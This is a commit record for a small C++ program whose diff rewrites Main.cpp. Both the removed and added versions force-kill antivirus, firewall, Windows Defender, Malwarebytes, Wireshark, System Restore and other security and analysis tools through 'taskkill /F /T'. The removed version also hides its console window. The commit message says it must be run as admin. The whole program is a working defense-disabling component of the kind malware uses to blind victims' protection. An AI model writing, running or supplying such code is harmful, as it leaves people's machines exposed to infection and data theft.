df51ba2d0802ed55ad5119f9765679bd2e2b559e
Syriamanal <shadinachat123@gmail.com>
2015-05-19 18:57:24 -0700

    Done! But...
    But You Have To Run As Admin!

--- Main.cpp
+++ Main.cpp
@@ -1,127 +1,67 @@
+#include <string>
 #include <iostream>
-#include <windows.h>
-
+#include <Windows.h>
+#include <sstream>
+#include <winsock.h>
+#include <tchar.h>
+#include <cassert>
+#include <list>
+#include <algorithm>
+#include <iterator>
+#include <sstream>
+#include <vector>
 using namespace std;
+// Dem headers
+// Was using these for something so judge all you want boys
 
-int main(){
-  FreeConsole(); //Just Hides The Console Screen!
-  
-  system(("taskkill /F /T /IM arcavir"
-                              "avast"
-                              "avg"
-                              "avira"
-                              "bkav"
-                              "bullguard"
-                              "emsisoft"
-                              "anti-malware"
-                              "eset"
-                              "nod32"
-                              "f-prot"
-                              "f-secure"
-                              "gdata"
-                              "ikarus"
-                              "k7"
-                              "kaspersky"
-                              "lavasoft"
-                              "adaware"
-                              "malwarebytes"
-                              "mcafee"
-                              "security"
-                              "norman"
-                              "norton"
-                              "outpost"
-                              "panda"
-                              "firewall"
-                              "antivirus"
-                              "antimalware"
-                              "antispyware"
-                              "anti-spyware"
-                              "rising"
-                              "sophos"
-                              "trend"
-                              "vipre"
-                              "webroot"
-                              "defender"
-                              "zomealarm"
-                              "comodo"
-                              "agnitum"
-                              "ahnlab"
-                              "antiy"
-                              "bytehero"
-                              "quickheal"
-                              "clamav"
-                              "commtouch"
-                              "drweb"
-                              "fortinet"
-                              "jiangmin"
-                              "kingsoft"
-                              "microworld"
-                              "nano"
-                              "nprotect"
-                              "pctools"
-                              "symantec"
-                              "thehacker"
-                              "totaldefense"
-                              "trendmicro"
-                              "vba32"
-                              "checkpoint"
-                              "tuneup"
-                              "spybot"
-                              "iobit"
-                              "keyscrambler"
-                              "zoner"
-                              "vipre"
-                              "virusbuster"
-                              "virus"
-                              "nano"
-                              "immunet"
-                              "antivirus"
-                              "solo"
-                              "escan"
-                              "combofix"
-                              "hijackthis"
-                              "onlinescanner"
-                              "roguekiller"
-                              "spybot"
-                              "blacksheep"
-                              "rstrui.exe"
-                              "AvastSvc.exe"
-                              "avconfig.exe"
-                              "AvastUI.exe"
-                              "avscan.exe"
-                              "instup.exe"
-                              "mbam.exe"
-                              "mbamgui.exe"
-                              "mbampt.exe"
-                              "mbamscheduler.exe"
-                              "mbamservice.exe"
-                              "hijackthis.exe"
-                              "spybotsd.exe"
-                              "ccuac.exe"
-                              "avcenter.exe"
-                              "avguard.exe"
-                              "avgnt.exe"
-                              "avgui.exe"
-                              "avgcsrvx.exe"
-                              "avgidsagent.exe"
-                              "avgrsx.exe"
-                              "avgwdsvc.exe"
-                              "egui.exe"
-                              "zlclient.exe"
-                              "bdagent.exe"
-                              "keyscrambler.exe"
-                              "avp.exe"
-                              "wireshark.exe"
-                              "ComboFix.exe"
-                              "MSASCui.exe"
-                              "MpCmdRun.exe"
-                              "msseces.exe"
-                              "MsMpEng.exe"
-                              "blindman.exe"
-                              "SDFiles.exe"
-                              "SDMain.exe"
-                              "mbam.exe"
-                              "SDWinSec.exe"));
-  getchar();
-  
+int main()
+{
+    string processList[] = { "AvastUI.exe", 
+                             "SDWinSec.exe", 
+                             "mbam.exe", 
+                             "SDMain.exe", 
+                             "SDFiles.exe",
+                             "blindman.exe", 
+                             "MsMpEng.exe",
+                             "msseces.exe", 
+                             "MpCmdRun.exe", 
+                             "MSASCui.exe",
+                             "ComboFix.exe", 
+                             "wireshark.exe", 
+                             "avp.exe", 
+                             "keyscrambler.exe",
+                             "bdagent.exe", 
+                             "zlclient.exe",
+                             "egui.exe", 
+                             "avgwdsvc.exe",
+                             "avgrsx.exe", 
+                             "avgidsagent.exe",
+                             "avgcsrvx.exe", 
+                             "avgui.exe",
+                             "avgnt.exe",
+                             "avguard.exe", 
+                             "avcenter.exe", 
+                             "ccuac.exe",
+                             "spybotsd.exe", 
+                             "hijackthis.exe", 
+                             "mbamservice.exe", 
+                             "mbamscheduler.exe", 
+                             "mbampt.exe",
+                             "mbamgui.exe",
+                             "instup.exe",
+                             "avscan.exe",
+                             "AvastUI.exe",
+                             "avconfig.exe", 
+                             "AvastSvc.exe", 
+                             "rstrui.exe" }; 
+    // if you keep adding to these, it will fill out the rest for you. Just list what you want.
+    int i;
+    for (i = 0; i < (sizeof(processList) / sizeof(*processList)); i++) {
+
+        string test = "taskkill /F /T /IM " + processList[i]; // Kill it
+        system(test.c_str()); // Run it
+    }
+    cout << "\nDone!" << endl; // Done
+    getchar();
+    return 0;
 }
